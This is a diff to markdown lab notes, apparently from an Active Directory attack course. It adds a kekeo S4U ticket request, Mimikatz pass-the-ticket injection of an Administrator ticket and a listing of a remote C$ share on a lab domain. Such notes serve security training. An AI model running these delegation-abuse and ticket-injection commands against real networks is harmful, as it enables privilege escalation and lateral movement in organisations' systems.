@@ -357,10 +357,30 @@ kekeo# tgt::ask /user:websvc /domain:dollarcorp.moneycorp.local /rc4:cc098f204c5
 
 
 ```powershell
-tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi
-/user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-
-mssql.dollarcorp.moneycorp.LOCAL
+tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:cifs/dcorp-mssql.dollarcorp.moneycorp.LOCAL
 ```
+
+
+- Using mimikatz, inject the ticket (Step 6):
+
+```powershell
+Invoke-Mimikatz -Command '"kerberos::ptt
+TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.
+MONEYCORP.LOCAL_cifs~dcorp-
+mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LO
+CAL.kirbi"'
+```
+
+
+- you can now run command on remote system 
+
+
+```
+ls \\dcorp-mssql.dollarcorp.moneycorp.local\c$
+```
+
+
+
 
 
 
